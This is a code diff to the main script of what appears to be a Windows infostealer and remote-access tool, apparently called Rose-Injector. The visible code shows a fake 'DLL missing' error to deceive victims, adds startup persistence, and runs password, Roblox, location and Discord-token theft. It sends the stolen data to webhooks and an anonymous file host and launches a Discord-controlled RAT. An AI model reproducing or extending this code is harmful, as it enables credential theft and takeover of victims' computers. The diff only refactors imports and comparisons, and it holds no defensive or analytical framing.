@@ -1,17 +1,7 @@
-import _webhook
-import discordc
-import informations
-import malicious
-import rat
-import injection
-from config import Config
-from _roblox import RobloxX
-from anonFile import uploadToAnonfiles
-from startup import StartUp
-ii = informations.Info()
-_webh = _webhook.WebhookX()
-cc = Config()
+from requirements_installation import requirementsinstallation
+
 try:
+    ### Imports
     import getpass
     import platform
     import ctypes
@@ -22,10 +12,9 @@ try:
     import socket
     import subprocess
     import threading
+    import sys
     import dhooks
     import requests
-    import psutil
-    import browser_cookie3
     from base64 import b64decode
     from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
     from json import dumps
@@ -37,32 +26,33 @@ try:
     from zipfile import ZipFile
     from Crypto.Cipher import AES
     from PIL import ImageGrab
-    from tabulate import tabulate
+    
+    ### File Imports
+    import _webhook
+    import discordc
+    import informations
+    import malicious
+    import rat
+    import injection
+    from config import Config
+    from _roblox import RobloxX
+    from anonFile import uploadToAnonfiles
+    from startup import StartUp
 except Exception:
-    try:
-        import requests
-        import subprocess
-        import os
-    except Exception:
-        import subprocess
-        subprocess.run("python -m pip install requests", shell=True, check=True)
-    
-    import requests
-    requirementsurl = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/scrapedata/requirements.txt").text
-    spliee = requirementsurl.split()
-    
-    for split in spliee:
-        subprocess.run(f"python -m pip install {split}", shell=True, check=True)
-        subprocess.run("cls", shell=True, check=True)
+    requirementsinstallation()
+
+ii = informations.Info()
+_webh = _webhook.WebhookX()
+cc = Config()
 
 
-if platform.system() is not "Windows":
-    exit()
+if platform.system() != "Windows":
+    sys.exit()
 
-if cc.get_fake_error() is True:
+if cc.get_fake_error() == True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
-if cc.get_start_up() is True:
+if cc.get_start_up() == True:
     StartUp()
 
 
@@ -866,17 +856,17 @@ if cc.get_password_stealing() is True:
     print(filetext)
     upload("kiwi", filetext)
 
-if cc.get_malicious_stealing() is True:
+if cc.get_malicious_stealing() == True:
     send_malicious()
 
-if cc.get_injection() is True:
+if cc.get_injection() == True:
     injection.InjectionX(webhook)
 
-if cc.get_roblox_stealing() is True:
+if cc.get_roblox_stealing() == True:
     RobloxX().run()
 
-if cc.get_location_stealing() is True:
+if cc.get_location_stealing() == True:
     _webh.locations_webhook(ii.global_info())
 
-if cc.get_discord_rat() is True:
+if cc.get_discord_rat() == True:
     rat.run_rat()
